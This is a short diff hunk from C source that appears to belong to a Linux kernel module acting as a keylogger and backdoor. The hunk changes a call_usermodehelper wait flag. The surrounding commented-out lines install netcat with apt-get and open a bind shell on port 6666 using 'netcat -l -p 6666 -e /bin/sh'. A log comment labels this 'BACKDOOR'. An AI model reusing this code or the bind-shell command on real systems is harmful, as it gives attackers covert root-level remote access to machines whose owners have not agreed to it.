@@ -142,7 +142,7 @@ static const char* keymap_shift[] =
 	    //char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
 	    //char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
 
-	    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); // Remove all netcat version
+	    call_usermodehelper(argv1[0], argv1, envp, UMH_NO_WAIT); // Remove all netcat version
 	    #ifdef LOG
 			//printk(KERN_ERR  "BACKDOOR un-install netcat returned  %i\n", ret);
 		#endif
